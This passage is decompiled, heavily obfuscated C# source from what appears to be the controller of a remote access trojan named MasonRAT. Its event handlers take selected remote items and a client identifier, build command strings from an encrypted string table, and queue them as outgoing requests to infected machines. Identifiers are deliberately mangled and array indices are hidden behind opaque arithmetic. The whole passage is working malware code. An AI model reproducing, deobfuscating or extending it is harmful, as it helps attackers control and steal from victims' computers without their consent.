    strArray1[((1258795988 > 665907172 ? 1178633414 : 1571511218) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - ((1178633422 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
    strArray1[368115897 % 740577280 - 1279656117 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + ((1217055277 > 1082708583 ? 1479858516 : 1973144688) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 << ((605650281 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text;
    strArray1[(764851716 | 1071002881) - 534165248 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + (-1434396516 - ~1581774545 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 << (1646728303 % 965638431 - 218291476 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 299);
    strArray1[(-1024399293 - ~1188886228 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ (1641628732 - 1477141790 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) % (-397775599 - 1803902906 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0] = str;
    strArray1[(((1813999290 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) > 1308465764 - 527551044 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ? 1962934279 /*0x75000007*/ - (871993461 << 661391192) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 : (404786422 ^ 404786431 >> 937321728) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 300);
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray1)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060D\u0609ـ\u0609دּﻋٽڙـ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[1248335555 - ~390588741 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 - (1184033124 + 938525394 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 << ((734718734 << 1295098031) - 1604661069 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 301);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[406477805 + 1606155600 % 16965311 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - (-1933416945 - 1943656182 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 302);
        strArray[((286043276 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - (575714428 - 289671157 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[((1593886343 > 1742842029 ? 1428261508 : 1071196131) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - ((810980721 ^ 437170414 % 1862121346) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 | (-1383015889 ^ ~1844314753) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = selectedItem.Text;
        strArray[(-1212069508 - 607603178 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + (525447105 - ~1294225585 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 303);
        strArray[(1697308561 > 1083387963 ? 48590 : 64786) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 - ((814072469 ^ (530867020 | 475246225)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 >> ((612258382 ^ 1524729106 << 1061048342) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[((364310677 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ (-1427693049 - (579805762 | 1657467301) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) % ((-252454864 ^ -373045512) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = selectedItem.Text.Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 304), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 305));
        strArray[((-133153263 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + (-1736288757 - 1314458950 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) % (1715377297 - 1305832962 % 701521993 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 306);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C̍ـڼۙﮪــــﻼ\u060E\u0608\u060A(object sender, EventArgs e)
  {
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 307), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 308), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 309), (770176467 + 1628862798 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - ~((1113653516 > 845681528 ? 1895928029 : -1767063258) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), (2128896949 > 649354605 ? 2087908530 : -1511089256) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - (1882394915 - (255590855 << 431153668) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 310) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + str));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060Eڅ\u0608ــ\u060D\u060D\u0609ـد\u0609ـؤٺ\u060C̍ټڙٸٺ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        // ISSUE: variable of a reference type
        string& local;
        // ISSUE: explicit reference operation
        string str = ^(local = ref this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 311) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
        local = str;
        this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 312);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ڙـټـڞ\u0609حْڙ\u060Dﻼ\u0608ﻋ(object sender, EventArgs e)
  {
    if (Operators.CompareString(this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 313), false) == 0)
    {
      string[] strArray = new string[(-1782311825 - -1745889716 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ^ ~(410859508 + -374437403 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 314);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(894653838 >> 1769782008) - 51 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + (8126097 - (367190216 << 332413641) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 >> (-416437285 - 2101491997 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ;
      strArray[(1005930860 + 1331527609 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ((2017346897 + (1597353085 << 1537355718) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) << 694589261 - -380932564 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
